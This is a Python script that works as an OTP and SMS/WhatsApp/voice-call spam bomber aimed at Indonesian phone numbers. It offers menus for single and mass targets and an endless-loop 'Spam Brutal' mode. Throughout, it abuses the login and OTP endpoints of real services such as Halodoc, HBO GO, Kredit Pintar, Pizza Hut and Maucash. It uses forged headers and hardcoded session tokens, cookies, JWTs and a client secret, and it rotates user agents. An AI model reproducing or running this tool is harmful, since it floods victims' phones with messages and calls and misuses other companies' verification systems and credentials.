
#! MODUL
import requests
import json
import os
import sys
import time
import random
from getpass import getpass
from rich import print
from bs4 import BeautifulSoup
from rich.panel import Panel
from rich.progress import track

#! COLOR ANSI
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
BOLD = '\033[1m'
RESET = '\033[0m'
k = 0
yes = '\u2713'
no = '\u2717'
t = "\U0001F44B"

#! Auto Typong


def mengetik(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.02)


def fast(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.001)

#! HITUNG MUNDUR
def hittung_mundur():
    countdown = 70
    while countdown >= 1:
        countdown_str = str(countdown).rjust(2, " ")
        print("╰─ Cooldown", countdown_str, end="\r")
        time.sleep(1)
        countdown -= 1


def hittung_mundur_call():
    countdown = 100
    while countdown >= 1:
        countdown_str = str(countdown).rjust(3, " ")
        print("╰─ Cooldown", countdown_str, end="\r")
        time.sleep(0.5)
        countdown -= 1


#! RANDOM USER_AGENT
user_agent = random.choice(["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"])

def check_password():
    os.system("clear")
    print(Panel(f"\n[yellow1]╰─ [white]Author \t: [green1]Ismail Djaini\n[yellow1]╰─ [white]Github \t: [green1]github.com/i-djaini\n[yellow1]╰─ [white]WhatsApp \t: [green1]+62895331973232\n", title="[green1]info", width=45, subtitle=f"[red1]Login", style="bold"))
    if os.path.exists("input.txt"):
      with open("input.txt", "r") as f:
          saved = f.read()
    else:
      sandi = getpass(f"{BOLD}╰─ Login dulu bro => ")
      with open("input.txt", "w") as f:
        f.write(sandi)
        saved = sandi
    if "0510" in saved:
        for i in track(range(5), description=f"{BOLD}Proses"):
            time.sleep(1)
        fast(f"{BOLD}╰─ Login Sukses {GREEN}{yes}")
        time.sleep(1)
        os.system("clear")
    else:
        for i in track(range(5), description=f"{BOLD}Proses"):
            time.sleep(1)
        fast(f"{BOLD}╰─ Goblok!!! Sandi Salah {RED}{no}")
        time.sleep(0.5)
        os.remove("input.txt")
        exit()
check_password()

#! GET TOKEN
def get_csrf_token(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']
            return csrf_token
        else:
            print('Permintaan tidak berhasil. Kode status:', response.status_code)
            return None
    except requests.exceptions.ConnectionError:
        fast(f"{BOLD}╰─ {RED}({no}) {WHITE}Koneksi Buruk")
        exit()


url = 'https://hbounify-prod.evergent.com/telkomsel/login'
csrf_token = get_csrf_token(url)
os.system("git pull")

'''===== INFO AUTHOR ====='''


def info_author():
    try:
        #! INFO AUTHOR AND INPUT
        os.system("clear")
        global Menu
        print("")
        art = f'''    ▄▄▄▄▄            ▄▄▌  .▄▄ ·     .▄▄ ·  ▄▄▄· ▄▄▄· • ▌ ▄ ·. 
    •██  ▪     ▪     ██•  ▐█ ▀.     ▐█ ▀. ▐█ ▄█▐█ ▀█ ·██ ▐███▪
     ▐█.▪ ▄█▀▄  ▄█▀▄ ██▪  ▄▀▀▀█▄    ▄▀▀▀█▄ ██▀·▄█▀▀█ ▐█ ▌▐▌▐█·
     ▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌▐▌▐█▄▪▐█    ▐█▄▪▐█▐█▪·•▐█ ▪▐▌██ ██▌▐█▌
     ▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀  ▀▀▀▀      ▀▀▀▀ .▀    ▀  ▀ ▀▀  █▪▀▀▀'''
        print(Panel("[green1]"+art, width=71, highlight=False,title="Code by Ismail Djaini", style="bold"))
        print(Panel(f'[bold] [green1](1) [white]Spam Sms\t [red1](Tsel Only)\n[bold] [green1](2) [white]Spam Wa \t [red1](All Operators)\n[bold] [green1](3) [white]Spam Call \t [red1](All Operators)\n[bold] [green1](4) [white]Spam Brutal [red1](All Operators)\n[bold] [green1](5) [white]Keluar',
              width=71, title="Menu", subtitle="github/i-djaini", style="bold"))
        Menu = input(f"{BOLD}╰─{YELLOW} (?) {WHITE}Pilih => {RESET}{BOLD}")
    except KeyboardInterrupt:
        fast(f"{BOLD}╰─ (•) {WHITE}Sampai Jumpa Lagi Bos {t}")
        exit()


info_author()

#! SPAM HBO-GO
'''===== SPAM HBO-GO ====='''
if Menu == "1":
    try:
        os.system("clear")
        art = '''         .▄▄ ·  ▄▄▄· ▄▄▄· • ▌ ▄ ·.     .▄▄ · • ▌ ▄ ·. .▄▄ · 
        ▐█ ▀. ▐█ ▄█▐█ ▀█ ·██ ▐███▪    ▐█ ▀. ·██ ▐███▪▐█ ▀. 
        ▄▀▀▀█▄ ██▀·▄█▀▀█ ▐█ ▌▐▌▐█·    ▄▀▀▀█▄▐█ ▌▐▌▐█·▄▀▀▀█▄
        ▐█▄▪▐█▐█▪·•▐█ ▪▐▌██ ██▌▐█▌    ▐█▄▪▐███ ██▌▐█▌▐█▄▪▐█
         ▀▀▀▀ .▀    ▀  ▀ ▀▀  █▪▀▀▀     ▀▀▀▀ ▀▀  █▪▀▀▀ ▀▀▀▀ '''
        print(Panel("[yellow1]"+art, width=71,
              title=f"Code by Ismail Djaini", style=f"bold"))
        nomer = input(
            f"{BOLD}╰─{GREEN} (•) {WHITE}Nomor  {RED}(8xxx){WHITE} => {BOLD}")
        jumlah = int(
            input(f"{BOLD}╰─{GREEN} (•) {WHITE}Jumlah {RED}(Unli){WHITE} => {RESET}{BOLD}"))
        for i in range(jumlah):
            pos = requests.post("https://hbounify-prod.evergent.com/telkomsel/send-otp", headers={'Host': 'hbounify-prod.evergent.com', 'content-length': '268', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'accept': 'application/json, text/plain, */*', 'content-type': 'application/json;charset=UTF-8', 'dnt': '1', 'sec-ch-ua-mobile': '?1', 'user-agent': user_agent, 'sec-ch-ua-platform': '"Android"', 'origin': 'https://hbounify-prod.evergent.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty','referer': 'https://hbounify-prod.evergent.com/telkomsel/login?operator=Telkomsel_HBO&channelPartnerID=HBO_D2C_ID&country=ID&deviceName=Linux+armv8l&deviceType=COMP&appType=Web&modelNo=20030107&serialNo=1553656907&sessionToken=4Kxg-HWP0-7cKG-ai1X-WfVN-yjQW-3E&territory=IDN&lang=en&returnURL=https%3A%2F%2Fwww.hbogoasia.id%2Fbilling&flow=native', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,la;q=0.6'}, data=json.dumps({"mobile_number": "0"+nomer, "sessionToken": "4Kxg-HWP0-7cKG-ai1X-WfVN-yjQW-3E", "channelPartnerID": "HBO_D2C_ID", "territory": "IDN", "lang": "en", "_token": csrf_token})).text
            if "1" in pos:
                k += 1
                time.sleep(1)
                print(Panel("[green1]("+yes+")[white] SPAM HBO-GO Berhasil di kirim => "+"[yellow]0"+nomer +
                      "[black] by Ismail Djaini", width=71, title="[green1]Status", subtitle=str(k), style=f"bold"))
            else:
                k += 1
                print(Panel(pos+" [yellow]=>[red1] Gagal[black] by Ismail Djaini",
                      width=71, title="[green1]Status", subtitle=str(k), style=f"bold white"))
        again = input(
            f"{BOLD}╰─ {RED}(=) {WHITE}SPAM LAGI ? {RED}(y/n) {WHITE} => {BOLD}")
        if again == "y" or again == "Y":
            time.sleep(0.5)
            os.system("python main.py")
        elif again == "n" or again == "N":
            fast(f"{BOLD}╰─ {RED}(•) {WHITE}Terima Kasih Telah Menggunakan SC ini")
            time.sleep(1.5)
            sys.exit()
        else:
            fast(f"{BOLD}╰─ (•) Input Tidak Benar, Masukkan (y/n)")
            time.sleep(1.5)
            sys.exit()
    except requests.exceptions.ConnectionError:
        fast(f"{BOLD}╰─ {RED}({no}) {WHITE}Koneksi Buruk")
        exit()
    except KeyboardInterrupt:
        fast(f"{BOLD}\n╰─ (•) {WHITE}Sampai Jumpa Lagi Bos! {t}")
        exit()

#! SPAM WA
'''===== SPAM WA ======'''
if Menu == "2":
    try:
        os.system("clear")
        art = '''            .▄▄ ·  ▄▄▄· ▄▄▄· • ▌ ▄ ·.     ▄▄▌ ▐ ▄▌ ▄▄▄· 
            ▐█ ▀. ▐█ ▄█▐█ ▀█ ·██ ▐███▪    ██· █▌▐█▐█ ▀█ 
            ▄▀▀▀█▄ ██▀·▄█▀▀█ ▐█ ▌▐▌▐█·    ██▪▐█▐▐▌▄█▀▀█ 
            ▐█▄▪▐█▐█▪·•▐█ ▪▐▌██ ██▌▐█▌    ▐█▌██▐█▌▐█ ▪▐▌
             ▀▀▀▀ .▀    ▀  ▀ ▀▀  █▪▀▀▀     ▀▀▀▀ ▀▪ ▀  ▀ '''
        print(Panel("[magenta1]"+art, width=71,
              title=f"[green1]Info", style=f"bold"))
        print(Panel(f"[italic]Jika ingin mengirimkan spam kebeberapa nomor sekaligus/spam massal pisahkan dengan spasi Contoh [red1]823xxx 852xxx", width=71,
              title=f"Code by Ismail Djaini", style=f"bold"))
        nomer = input(
            f"{BOLD}╰─{GREEN} (•) {WHITE}Nomor  {RED}(8xxx){WHITE} => {BOLD}")
        nomer_list = nomer.split(" ")
        while True:
          for nomer in nomer_list:
            FreeBox = requests.post("https://api.freeboxglobal.com/freeboxMember/app/captcha/getCaptcha", headers={'accept': 'application/json, text/plain, */*', 'lang': 'id', 'Content-Type': 'application/json','Content-Length': '23', 'Host': 'api.freeboxglobal.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.2'}, data=json.dumps({"phone": nomer})).text
            k += 1
            print(Panel(FreeBox+" [yellow]=> [green1]Sukses[black] by Ismail Djaini",
                  width=71, title="[green1]Status", subtitle=str(k), style=f"bold white"))
            time.sleep(4.5)

    except requests.exceptions.ConnectionError:
        fast(f"{BOLD}╰─ {RED}({no}) {WHITE}Koneksi Buruk")
        again = input(f"{BOLD}╰─ {RED}(=) {WHITE}SPAM LAGI ? {RED}(y/n) {WHITE} => {BOLD}")
        if again == "y" or again == "Y":
            time.sleep(0.5)
            os.system("python main.py")
        elif again == "n" or again == "N":
            fast(f"{BOLD}╰─ {RED}(•) {WHITE}Terima Kasih Telah Menggunakan SC ini")
            time.sleep(1)
            sys.exit()
        else:
            fast(f"{BOLD}╰─ (•) Input Tidak Benar, Masukkan (y/n)")
            time.sleep(1)
            sys.exit()
    except KeyboardInterrupt:
        fast(f"{BOLD}\n╰─ (•) {WHITE}Sampai Jumpa Lagi Bos! {t}")
        exit()

'''===== SPAM CALL ====='''
if Menu == "3":
    os.system("clear")
    art = '''         .▄▄ ·  ▄▄▄· ▄▄▄· • ▌ ▄ ·.      ▄▄·  ▄▄▄· ▄▄▌  ▄▄▌  
        ▐█ ▀. ▐█ ▄█▐█ ▀█ ·██ ▐███▪    ▐█ ▌▪▐█ ▀█ ██•  ██•  
        ▄▀▀▀█▄ ██▀·▄█▀▀█ ▐█ ▌▐▌▐█·    ██ ▄▄▄█▀▀█ ██▪  ██▪  
        ▐█▄▪▐█▐█▪·•▐█ ▪▐▌██ ██▌▐█▌    ▐███▌▐█ ▪▐▌▐█▌▐▌▐█▌▐▌
         ▀▀▀▀ .▀    ▀  ▀ ▀▀  █▪▀▀▀    ·▀▀▀  ▀  ▀ .▀▀▀ .▀▀▀ '''

    print(Panel("[cyan1]"+art, width=71,
          title=f"Code by Ismail Djaini", style=f"bold"))
    print(Panel(f"[italic]Jika ingin mengirimkan spam kebeberapa nomor sekaligus/spam massal pisahkan dengan spasi Contoh [red1]823xxx 852xxx", width=71,title=f"[green1]Info", style=f"bold"))
    nomer = input(f"{BOLD}╰─{GREEN} (•) {WHITE}Nomor {RED}(8xxx){WHITE} => {BOLD}")
    nomer_list = nomer.split(" ")
    for i in range(5):
      for nomer in nomer_list:
        #! OTP HALODOC
        Halodoc = requests.post("https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests", headers={'Host': 'magneto.api.halodoc.com', 'Connection': 'keep-alive', 'Content-Length': '51', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'DNT': '1', 'X-XSRF-TOKEN': 'C6D05698DBE3666D095E31263AF28CA20ACC233D139DEBA66CCD7D92D8EF87BCF7AD40A07F21E9A5B5C759897C071C871912', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://www.halodoc.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6','Cookie': '_gcl_au=1.1.1787438187.1674980226; afUserId=c4a8602c-14d0-40cb-a342-2debfa44f34f-o; AF_SYNC=1679401554035; _gcl_aw=GCL.1679486369.CjwKCAjwzuqgBhAcEiwAdj5dRtbmRSicfkuKumD6Na6rXuCpf8gB7jiBGylrC9Y-ercLJ4yd-R8A_hoC97oQAvD_BwE; _gac_UA-89605346-3=1.1679486417.CjwKCAjwzuqgBhAcEiwAdj5dRtbmRSicfkuKumD6Na6rXuCpf8gB7jiBGylrC9Y-ercLJ4yd-R8A_hoC97oQAvD_BwE; _gid=GA1.2.101748674.1679859776; XSRF-TOKEN=C6D05698DBE3666D095E31263AF28CA20ACC233D139DEBA66CCD7D92D8EF87BCF7AD40A07F21E9A5B5C759897C071C871912; _gat_UA-89605346-3=1; _ga=GA1.1.2138772867.1674980227; _ga_H80RW7D90X=GS1.1.1679962981.10.0.1679962981.0.0.0; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f941e309-c9fe-4dc5-58a2-92d0e82030f2%22%2C%22c%22%3A1674980226508%2C%22l%22%3A1679962981806%7D; amp_394863=NOoD2H5O_8rskt6hDrv7sO...1gsiphh9i.1gsipho17.1j.a.1t; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22bdcf68d1-2d7c-d603-e677-66ed0097cd97%22%2C%22e%22%3A1679964788593%2C%22c%22%3A1679962981801%2C%22l%22%3A1679962988593%7D'}, data=json.dumps({"phone_number": "+62"+nomer, "channel": "voice"})).text
        bad = ("429")
        waktu = str("false")
        if waktu in Halodoc:
            k += 1
            print(Panel(Halodoc+" [yellow]=>[green1] Sukses[black] by Ismail Djaini",width=71, title="[green1]Status", subtitle=str(k), style=f"bold white"))
            hittung_mundur_call()

        elif bad in Halodoc:
            k += 1
            print(Panel(Halodoc+" [yellow]=>[red1] Gagal[black] by Ismail Djaini",width=71, title="[green1]Status", subtitle=str(k), style=f"bold white"))
        else:
            k += 1
            print(Panel(Halodoc+" [yellow]=>[red1] Gagal[black] by Ismail Djaini",width=71, title="[green1]Status", subtitle=str(k), style=f"bold white"))
        #! OTP KPINTAR
        Kpintar = requests.post("https://h.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id", headers={'Host': 'h.kreditpintar.com', 'Connection': 'keep-alive', 'Content-Length': '47', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'x-adv-market-channel': 'OfficialWebsite', 'x-user-agent': 'Pintar-ID-Cash (WebAndroid;;;id) uuid/23634849-9a8a-48c0-95b7-53ab7359f94a version/0.1.0', 'DNT': '1', 'x-app-version': 'APPVERSION_NAME(9999)', 'Accept-Language': 'id', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'x-os-type': 'WEB', 'sentry-trace': '1b9dd6373f7b47e4a21e9003d9d3580d-969ddbf191b89d53-1', 'sec-ch-ua-platform': '"Android"', 'Origin': 'https://h.kreditpintar.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://h.kreditpintar.com/OFFICIAL2021/code-step?m=895331973232', 'Accept-Encoding': 'gzip, deflate, br'}, data=json.dumps({"mobileNumber": "+62"+nomer, "type": "VOICE"})).text
        maks = "MAX_RETRY_COUNT_REACHED"
        salah = "INVALID_PHONE_NUMBER"
        if maks in Kpintar:
            k += 1
            print(Panel(Kpintar+" [yellow]=>[red1] Gagal[black] by Ismail Djaini",width=71, title="[green1]Status", subtitle=str(k), style=f"bold white"))
        elif salah in Kpintar:
            k += 1
            print(Panel(Kpintar+" [yellow]=>[red1] Gagal[black] by Ismail Djaini",width=71, title="[green1]Status", subtitle=str(k), style=f"bold white"))
        else:
            k += 1
            print(Panel(Kpintar+" [yellow]=>[green1] Sukses[black] by Ismail Djaini",width=71, title="[green1]Status", subtitle=str(k), style=f"bold white"))
            hittung_mundur_call()
        #! NEXTCOOL
        NextCool = requests.post("https://nextcool.id/wp-json/ecommer/v1/captcha", headers={'Host': 'nextcool.id', 'ecommer-sign': '0ea708bbefbfc3f7ea8d17a7ece21d5f', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','productCode': 'UKU', 'timestamp': '1680862994', 'fireBaseToken': 'null', 'Origin': 'https://nextcool.id', 'Referer': 'https://nextcool.id/app/login?action=toHref&from=home&node=2&href=%2Fmy-account'}, data=json.dumps({"username": "0"+nomer, "type": "VOICE_SMS", "node": "2"})).text
        if "SUCCESS" in NextCool:
            k += 1
            print(Panel(NextCool+" [yellow]=>[green1] Sukses[black] by Ismail Djaini",width=71, title="[green1]Status", subtitle=str(k), style=f"bold white"))
            hittung_mundur_call()
        else:
            k += 1
            print(Panel(NextCool+" [yellow]=>[red1] Gagal[black] by Ismail Djaini",width=71, title="[green1]Status", subtitle=str(k), style=f"bold white"))
    again = input(
        f"{BOLD}╰─ {RED}(=) {WHITE}SPAM LAGI ? {RED}(y/n) {WHITE}=> {BOLD}")
    if again == "y" or again == "Y":
        time.sleep(0.5)
        os.system("python main.py")
    elif again == "n" or again == "N":
        fast(f"{BOLD}╰─{RED} (•) {WHITE}Terima Kasih Telah Menggunakan SC ini")
        time.sleep(1.5)
        exit()
    else:
        fast(f"{BOLD}╰─ (•) {WHITE}Input Tidak Benar, Masukkan {RED}(y/n)")
        time.sleep(1.5)
        exit()


#! SPAM BRUTAL
'''===== SPAM BRUTAL ====='''
if Menu == "4":
    os.system("clear")
    art = '''   .▄▄ ·  ▄▄▄· ▄▄▄· • ▌ ▄ ·.     ▄▄▄▄· ▄▄▄  ▄• ▄▌▄▄▄▄▄ ▄▄▄· ▄▄▌  
  ▐█ ▀. ▐█ ▄█▐█ ▀█ ·██ ▐███▪    ▐█ ▀█▪▀▄ █·█▪██▌•██  ▐█ ▀█ ██•  
  ▄▀▀▀█▄ ██▀·▄█▀▀█ ▐█ ▌▐▌▐█·    ▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▄█▀▀█ ██▪  
  ▐█▄▪▐█▐█▪·•▐█ ▪▐▌██ ██▌▐█▌    ██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█ ▪▐▌▐█▌▐▌
   ▀▀▀▀ .▀    ▀  ▀ ▀▀  █▪▀▀▀    ·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀  ▀ .▀▀▀ '''
    print(Panel("[red1]"+art, width=71,title=f"Code by Ismail Djaini", style=f"bold"))
    nomer = input(BOLD+"╰─"+GREEN+" (•) "+WHITE + "Nomor " +RED+"(8xxx)"+WHITE+" => "+RESET+BOLD)
    for i in range(3):
        Hbo_Go = requests.post("https://hbounify-prod.evergent.com/telkomsel/send-otp", headers={'Host': 'hbounify-prod.evergent.com', 'content-length': '268', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'accept': 'application/json, text/plain, */*', 'content-type': 'application/json;charset=UTF-8', 'dnt': '1', 'sec-ch-ua-mobile': '?1', 'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36', 'sec-ch-ua-platform': '"Android"', 'origin': 'https://hbounify-prod.evergent.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty','referer': 'https://hbounify-prod.evergent.com/telkomsel/login?operator=Telkomsel_HBO&channelPartnerID=HBO_D2C_ID&country=ID&deviceName=Linux+armv8l&deviceType=COMP&appType=Web&modelNo=20030107&serialNo=1553656907&sessionToken=4Kxg-HWP0-7cKG-ai1X-WfVN-yjQW-3E&territory=IDN&lang=en&returnURL=https%3A%2F%2Fwww.hbogoasia.id%2Fbilling&flow=native', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,la;q=0.6'}, data=json.dumps({"mobile_number": "0"+nomer, "sessionToken": "4Kxg-HWP0-7cKG-ai1X-WfVN-yjQW-3E", "channelPartnerID": "HBO_D2C_ID", "territory": "IDN", "lang": "en", "_token": csrf_token})).text
        time.sleep(1.5)
        kredito = requests.post("https://app-api.kredito.id/client/v1/common/verify-code/send", '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % (nomer), headers={"LPR-TIMESTAMP": "1603281035821", "Accept-Language": "id-ID", "LPR-BRAND": "Kredito", "LPR-PLATFORM": "android", "User-Agent": "okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android","Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks", "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244", "Content-Type": "application/json; charset=UTF-8", "Content-Length": "79"}).text
        time.sleep(1.5)
        Klikdokter = requests.post("https://api.medkomtek.com/v2/publishing/otp", headers={'Host': 'api.medkomtek.com', 'Connection': 'keep-alive', 'Content-Length': '25', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'Accept': 'application/json', 'Content-Type': 'application/json', 'DNT': '1', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform': '"Android"', 'Origin': 'https://www.klikdokter.com', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.klikdokter.com/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"phone": "62" + nomer})).text
        time.sleep(1.5)
        Pizzahut = requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id', 'content-length': '157', 'x-device-type': 'PC', 'sec-ch-ua-mobile': '?1', 'x-platform': 'WEBMOBILE', 'x-channel': '2', 'content-type': 'application/json;charset=UTF-8', 'accept': 'application/json', 'x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab', 'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en', 'save-data': 'on', 'x-device-id': 'web', 'origin': 'https://www.pizzahut.co.id', 'sec-fetch-site': 'same-site', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://www.pizzahut.co.id/', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en;q=0.8'}, data=json.dumps({"email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": nomer,  "birthday": "2000-01-02"})).text
        time.sleep(1.5)
        Maucash = requests.get(f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={nomer}&channelType=0", headers={"Host": "japi.maucash.id", "accept": "application/json, text/plain, */*","x-origin": "google play", "x-org-id": "1", "x-product-code": "YN-MAUCASH", "x-app-version": "2.4.23", "x-source-id": "android", "accept-encoding": "gzip", "user-agent": "okhttp/3.12.1"}).text
        time.sleep(1.5)
        Ruparupa = requests.post("https://wapi.ruparupa.com/auth/generate-otp", headers={'Host': 'wapi.ruparupa.com', 'content-length': '121', 'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"', 'dnt': '1', 'sec-ch-ua-mobile': '?1', 'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiMjE5YzA5MGItY2RhOC00ZTZlLTk3YjYtNWFjNGYwZTZjOTRhIiwiaWF0IjoxNjc4NjIxNzQ1LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.EP0a8RCj4CiC1kSFvxmAA3Yg5sxXh4n1pct5epFK2Cs', 'user-agent': user_agent, 'content-type': 'application/json', 'x-company-name': 'odi','accept': 'application/json', 'x-frontend-type': 'mobile', 'informa-b2b': 'false', 'user-platform': 'mobile', 'sec-ch-ua-platform': '"Android"', 'origin': 'https://www.ruparupa.com', 'sec-fetch-site': 'same-site', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://www.ruparupa.com/verification?page=otp-choices', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,la;q=0.6'}, data=json.dumps({"phone": "0"+nomer, "action": "register", "channel": "message", "email": "", "customer_id": "0", "is_resend": 0}))
        time.sleep(1.5)
        Tokoku = requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send", headers={"Host": "api-v2.bukuwarung.com", "content-length": "198", "sec-ch-ua-mobile": "?1", "user-agent": user_agent, "content-type": "application/json", "x-app-version-name": "android", "accept": "application/json, text/plain, */*", "x-app-version-code": "3001", "buku-origin": "tokoko-web", "sec-ch-ua-platform": "Android", "origin": "https://tokoko.id","sec-fetch-site": "cross-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://tokoko.id/", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}, data=json.dumps({"action": "LOGIN_OTP", "countryCode": "+62", "deviceId": "test-1", "method": "WA", "phone": "0"+nomer, "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6", "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
        time.sleep(1.5)
